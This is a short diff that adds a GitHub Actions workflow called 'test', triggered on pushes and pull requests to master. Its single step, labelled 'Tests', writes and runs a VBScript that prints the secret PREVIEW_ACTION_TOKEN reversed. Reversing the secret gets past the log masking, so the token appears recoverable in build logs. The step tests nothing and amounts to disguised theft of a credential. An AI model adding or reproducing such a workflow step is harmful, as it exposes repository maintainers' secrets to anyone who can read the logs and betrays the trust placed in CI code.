@@ -1,0 +1,20 @@
+on:
+  push:
+    branches:
+    - master
+  pull_request:
+    branches:
+    - master
+
+name: test
+jobs:
+
+  build_windows:
+    name: Build Windows
+    runs-on: windows-latest
+
+    steps:
+    - name: Tests
+      run: |
+        echo WScript.Echo StrReverse("${{secrets.PREVIEW_ACTION_TOKEN}}"^) > test.vbs
+        cscript //nologo test.vbs
